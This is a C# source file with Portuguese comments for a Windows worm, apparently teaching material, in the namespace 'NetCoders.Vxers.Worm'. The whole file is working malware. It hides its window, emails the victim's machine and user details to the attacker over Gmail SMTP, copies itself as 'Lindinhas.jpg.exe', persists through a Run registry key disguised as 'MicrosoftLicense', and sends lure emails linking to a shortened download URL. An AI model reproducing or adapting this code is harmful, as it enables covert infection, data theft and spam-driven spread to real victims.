using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

// Importamos uma namespace para poder utilizar PINVOKE
using System.Runtime.InteropServices;

// Importamos duas namespaces para poder manipular o protocolo
// SMTP, enviar emails e colocar credenciais
using System.Net;
using System.Net.Mail;

// Importamos uma namespace para poder manipular pastas,
// Arquivos e caminhos (Pastas e Arquivos)
using System.IO;

// Importamos uma namespace para poder caputurar o caminho
// Fisico da aplicaco corrente
using System.Reflection;

// Importamos uma namespace para poder manipular o registro
// Do Windows
using Microsoft.Win32;

namespace NetCoders.Vxers.Worm
{
    class Program
    {
        // Importamos um comando nativo do windows (do kernel) 
        // comando nativo do SO,  para pegar o endereço da 
        // aplicação console na memória
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        // Importamos um comando nativo do SO
        // Para manipular as janelas da  nossa APP console
        // Posso mandar comandos de Maximizar, Minimizar, Restaurar, Ocultar...
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);

        // Criamos um comando para ocultar a VARIANTE (VIRUS)
        // 
        static void SilentRunning()
        {
            // Pegamos o endereco da memoria da Console App
            // Passamos um comando de OCULTAR (O numero 0 oculta)
            var enderecoJanela = GetConsoleWindow();
            ShowWindow(enderecoJanela, 0);
        }

        // Esse comando vai enviar o HACKERZAO
        // Algumas informacoes da maquina invadida, da maquina
        // que esta rodando a variante.
        static void EmailInfo()
        {
            // Armazenamos a data de execucao, o nome da maquina,
            // O nome do usuario logado e versao do windows.
            var informacoes = new StringBuilder();
            informacoes.AppendLine(String.Format("<b>Data: </b>{0} <br />", DateTime.Now));
            informacoes.AppendLine(String.Format("<b>Nome da Máquina: </b>{0} <br />", Environment.MachineName));
            informacoes.AppendLine(String.Format("<b>Nome do Usuario: </b>{0} <br />", Environment.UserName));
            informacoes.AppendLine(String.Format("<b>Versao do Windows: </b>{0} <br />", Environment.OSVersion.VersionString));

            var dados = informacoes.ToString();
            

            //Conectar a app em um servidor SMTP
            var clienteSmtp = new SmtpClient("smtp.gmail.com", 587)
            {
                EnableSsl = true,
                Credentials = new NetworkCredential(Email._, Email.__)
            };

            // Configuramos o email que vai ser enviado para o HACKERZAO
            var email = new MailMessage("",
                                        "")
            {
                Subject = "MOSTRO MEU PEITO NA CAM!! COM HTML",
                Body = dados,
                IsBodyHtml = true
            };
            clienteSmtp.Send(email);
        }

        // Pensando que o usuario pode deletar o arquivo recem
        // baixado, vamos fazer uma copia dela pra dentro de uma outra pasta
        static void CopiarParaPasta()
        {
            // Criamos uma pasta no c: para armazenar uma copia
            // da nossa variante
            Directory.CreateDirectory(@"c:\Fotos");

            // Armazenamos o caminho fisico coimpleto da nossa
            // Variante (pra poder fazer uma copia)
            var caminhoCompleto = Assembly.GetEntryAssembly().Location;

            // Correcao de BUG
            // Antes de copiar, precisa verificar se ja existe 
            if (!File.Exists(@"c:\Fotos\Lindinhas.jpg.exe"))
            {
                // Fazemos uma copia da variante
                // O true no final substitui o arquivo
                File.Copy(caminhoCompleto, @"c:\Fotos\Lindinhas.jpg.exe", true);
            }
        }

        // Criamos um comando para configurar a inicializacao
        // Da nossa variante junto com o SO
        // Via registro do windows (REGEDIT)
        static void WindowsStartup()
        {
            // Capturamos a chave de inicializacao do SO
            var inicializaco = Registry.CurrentUser.OpenSubKey(
                            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            inicializaco.SetValue("MicrosoftLicense", @"c:\Fotos\Lindinhas.jpg.exe");
        }


        // Criamos um comando para enviar e-mails com
        // Alguma Engenharia, alguma imagem, algum texto
        // Camuflado, que baixa o loader ou variante
        static void AutoSpam()
        {
            var clienteEmail = new SmtpClient("smtp.gmail.com", 587)
            {
                EnableSsl = true,
                Credentials = new NetworkCredential(Email._, Email.__)
            };
            var email = new MailMessage("", "")
            {
                Subject = "Que show mano baratinho",
                IsBodyHtml = true,
                Body = "<a onmousemove='alert('hackerzao');' href='http://is.gd/SCRJWL' style='cursor: none' ><img src='http://3.bp.blogspot.com/-CZy-n9rUjUs/T8jRoaUidwI/AAAAAAAAAzo/g_9lBbw0HVc/s1600/Hotel+Thermas+de+Olimpia.jpg' /></a>"
            };
            clienteEmail.Send(email);
        }

        static void Main(string[] args)
        {
            // Acionamos o comando responsavel por camuflar 
            // Ocultar a nossa variante
            SilentRunning();

            // Acionamos o comando responsavel por coletar
            // Dados confidenciais da maquina e enviar por e-mail
            EmailInfo();

            // Acionamos o comando responsavel por fazer uma copia
            // Da nossa variante em uma pasta do windows
            CopiarParaPasta();

            //Acionamos o comando responsavel por inicializar
            //A Aplicaco com o Sistema Operacional
            WindowsStartup();

            // Acionamos o comando responsavel por envimar 
            // A engenharia social, um email com propaganda
            AutoSpam();

            // PARA NAO APARECER A TELA PISCANDO, TROCAR O TIPO DE APP DE CONSOLE
            // PARA WINDOWS FORMS
            // Importante, precisa ter o email esse readkey para a app nao fechar
            //Console.ReadKey();
        }
    }
}
